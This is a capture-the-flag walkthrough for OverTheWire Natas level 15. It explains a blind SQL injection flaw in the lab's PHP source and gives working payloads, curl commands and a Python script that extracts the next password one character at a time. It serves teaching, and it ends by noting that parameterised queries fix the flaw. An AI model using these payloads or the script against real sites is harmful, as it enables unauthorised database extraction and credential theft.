> **Level Goal:** Find the password for the next level.

---

## Connection Details

| Field    | Value                                                        |
| -------- | ------------------------------------------------------------ |
| URL      | `http://natas15.natas.labs.overthewire.org`                  |
| Username | `natas15`                                                    |
| Password | *found in [Natas Level 13 → 14](natas-level-13-level-14.md)* |

---

## Tools Used

- A web browser
- **View sourcecode** — the page links to its own PHP source
- **`curl`** — to confirm injection behaviour
- **Python** — to automate character-by-character extraction

---

## Solution

### Step 1 — Open the URL

Navigate to `http://natas15.natas.labs.overthewire.org` and log in with the password from Level 14.

The page has a single **Username** field. Submitting any value returns either **"This user exists."** or **"This user doesn't exist."** — nothing else. Click **View sourcecode**.

---

### Step 2 — Read the Source Code

```php
<?php
/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
        if(mysqli_num_rows($res) > 0) {
            echo "This user exists.<br>";
        } else {
            echo "This user doesn't exist.<br>";
        }
    } else {
        echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>
```

Walking through the code:

```php
if(array_key_exists("username", $_REQUEST)) {
```

Only runs if a `username` parameter was submitted. `$_REQUEST` captures both GET and POST, so the form and direct URL parameters both trigger it.

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
```

The username is concatenated directly into the SQL string with no escaping. The `\"` sequences are PHP escape syntax for a literal double-quote character inside a double-quoted PHP string — the assembled SQL wraps the input in double quotes: `username="<input>"`.

```php
if(array_key_exists("debug", $_GET)) {
    echo "Executing query: $query<br>";
}
```

If `?debug` is in the URL, the full assembled query is printed before execution. Useful for verifying a payload assembles correctly before testing it blind.

```php
$res = mysqli_query($link, $query);
if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
} else {
    echo "Error in query.<br>";
}
```

`mysqli_query()` returns `false` on a SQL syntax error, or a result object on success (even with zero rows). The outer `if($res)` catches syntax errors. The inner `mysqli_num_rows($res) > 0` checks whether any rows matched. No column data is ever read or printed — only the row count. This is what makes `UNION SELECT` useless and forces the boolean approach.

The same unsanitised concatenation as Level 14 — the injection point is identical. Three things to note:

- **Schema is exposed** in the comment: table `users`, columns `username` and `password`. In a real target you'd enumerate this blind via `information_schema`; here it's free.
- **No password is ever printed.** The only output is a row-count boolean: exists or doesn't exist. This is **blind SQL injection** — you can manipulate the query but have no direct data channel back.
- **Errors are always shown** (`"Error in query."`) with no `debug` gate, so a broken payload produces a distinct third response rather than silently matching "doesn't exist".

---

### Understand Blind SQL Injection

Since the page only returns a boolean, the attack asks a series of yes-or-no questions: "Is the character at position N equal to X?" Iterate X over the full charset, record the hit, advance to N+1. One character recovered per up-to-62 requests.

The MySQL function for this is `SUBSTRING(string, position, length)` (1-based indexing). It extracts one character at a known position. To compare it, use `ORD()`, which converts a character to its ASCII ordinal value — an integer. Comparing integers sidesteps collation and case-sensitivity entirely: lowercase `a` is 97, uppercase `A` is 65, `!` is 33 — all unambiguously distinct.

Payload for position 1, testing whether the character is `a` (ASCII 97):

```
natas16" AND ORD(SUBSTRING(password,1,1)) = 97 -- -
```

Assembled query:

```sql
SELECT * from users where username="natas16" AND ORD(SUBSTRING(password,1,1)) = 97 -- -"
```

The `-- -` is the ANSI SQL comment syntax — two dashes, a space, and a dummy trailing character. It discards the `"` PHP appends after the input. MySQL also supports `#` as a comment marker, but some server configurations strip or encode it before it reaches the database; `-- -` is more reliable.

If the character at position 1 has ASCII value 97 (i.e. is `a`), the query returns a row → "This user exists." Otherwise → "This user doesn't exist."

**Alternative syntaxes that also work on this server:** `BINARY SUBSTRING(password,1,1) LIKE 'a'` and `SUBSTRING(password,1,1) = BINARY 'a'` both enforce case-sensitive string comparison. `ORD()` is preferred here because it avoids any dependency on how `BINARY` interacts with the server's MySQL version or collation configuration.

`UNION SELECT` won't work here: it produces extra rows, but the application discards all column values and only counts rows. The boolean channel is the only channel available.

---

### Step 3 — Confirm the Injection Point

```bash
curl -u natas15:<password> \
     "http://natas15.natas.labs.overthewire.org/index.php?debug" \
     --data 'username=natas16'
```

|Flag / argument|Meaning|
|---|---|
|`-u natas15:<password>`|HTTP Basic Authentication — sends `username:password` encoded in the `Authorization` header, matching what the browser prompt requires|
|`"...index.php?debug"`|The target URL. `?debug` appends the `debug` GET parameter, triggering the query echo in the PHP source|
|`--data 'username=natas16'`|Sends a POST request body with the `username` field set. `--data` (or `-d`) URL-encodes the string and sets `Content-Type: application/x-www-form-urlencoded`|
|`\`|Shell line continuation — splits the command across multiple lines for readability; has no effect on execution|

```
Executing query: SELECT * from users where username="natas16"
This user exists.
```

`natas16` is a valid user. Test the false branch with an implausible character:

```bash
curl -u natas15:<password> \
     "http://natas15.natas.labs.overthewire.org/index.php?debug" \
     --data 'username=natas16" AND ORD(SUBSTRING(password,1,1)) = 33 -- -'
```

`!` is ASCII 33 — an implausible first character for a password. No shell quoting gymnastics needed here since there are no single quotes in the payload.

```
Executing query: SELECT * from users where username="natas16" AND ORD(SUBSTRING(password,1,1)) = 33 -- -"
This user doesn't exist.
```

Both branches confirmed. Proceed to automate.

---

### Step 4 — Automate the Extraction

Before iterating characters, you need to know the password length. Query it directly:

```
natas16" AND LENGTH(password) = 32 -- -
```

Increment the number until the server returns "This user exists.", that's the length.

With length known: 62-character charset × 32 positions = up to 1984 requests worst case (matching character is last tried at every position). On average, the hit comes halfway through the charset — ~31 attempts per position, ~992 requests total.

```python
import requests
from requests.auth import HTTPBasicAuth

url      = "http://natas15.natas.labs.overthewire.org/index.php"
auth     = HTTPBasicAuth("natas15", "<password>")  # passed to every request as HTTP Basic Auth
charset  = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
password = ""

for position in range(1, 33):          # MySQL SUBSTRING is 1-based; 32 chars total
    for char in charset:
        # ord(char) converts the candidate character to its ASCII value for integer comparison
        payload = f'natas16" AND ORD(SUBSTRING(password,{position},1)) = {ord(char)} -- -'
        # requests.post sends a POST with application/x-www-form-urlencoded body
        # auth= handles the Authorization header automatically
        r = requests.post(url, auth=auth, data={"username": payload})
        if "This user exists." in r.text:   # boolean signal: row returned = character matched
            password += char
            print(f"[{position:02d}] {char} → {password}")
            break                            # stop trying chars for this position, move to next

print(f"\nPassword: {password}")
```

Before running it, put the password of [Natas Level 13 → 14](natas-level-13-level-14.md)  in `auth`.

```bash
python3 natas15.py
```

Output (abbreviated):

```
[01] W → W
[02] a → Wa
[03] j → Waj
...
[32] z → <password>
```

That is the password for [Natas level 15 → 16](natas-level-15-level-16.md).

---

## Key Takeaways

- **Blind SQL injection works through a boolean channel.** No direct data output is needed, a yes/no response is enough to recover arbitrary data character by character.
- **`ORD(SUBSTRING())` is the most robust MySQL extraction primitive.** Converting characters to ASCII ordinals before comparing avoids collation and case-sensitivity issues entirely, integers are always unambiguous.
- **Hiding output does not fix injection.** The root cause, unsanitised string concatenation, is identical to Level 14. Parameterised queries fix it; obscuring output does not.
- **Exposed schema in source comments eliminates recon.** In a real target, table and column names require additional blind enumeration via `information_schema`.

---